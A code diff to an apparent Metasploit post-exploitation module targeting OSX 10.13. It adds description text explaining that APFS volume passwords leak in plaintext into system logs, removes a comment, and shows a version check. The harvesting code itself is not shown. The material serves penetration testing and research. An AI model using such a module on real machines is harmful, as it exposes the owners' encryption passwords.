@@ -10,13 +10,16 @@ class MetasploitModule < Msf::Post
       'Description'   => %q(
         This module exploits a flaw in OSX 10.13 through 10.13.3
         that discloses the passwords of encrypted APFS volumes.
+
+        In OSX a normal user can use the 'log' command to view the system
+        logs. In OSX 10.13 to 10.13.2 when a user creates an encrypted APFS
+        volume the password is visible in plaintext within these logs.
       ),
       'License'       => MSF_LICENSE,
       'References'    =>
         [
           [ 'URL', 'https://thehackernews.com/2018/03/macos-apfs-password.html' ],
           [ 'URL', 'https://www.mac4n6.com/blog/2018/3/21/uh-oh-unified-logs-in-high-sierra-1013-show-plaintext-password-for-apfs-encrypted-external-volumes-via-disk-utilityapp' ]
-
         ],
       'Platform'      => 'osx',
       'Arch'          => ARCH_ALL,
@@ -38,10 +41,6 @@ class MetasploitModule < Msf::Post
   end
 
   def check
-    # sw_vers looks like this:
-    # ProductName: macOS
-    # ProductVersion: 10.12
-    # BuildVersion: 7A100
     osx_version = cmd_exec('sw_vers -productVersion')
     return Exploit::CheckCode::Vulnerable if osx_version =~ /^10\.13[\.[0-3]]?$/
     Exploit::CheckCode::Safe
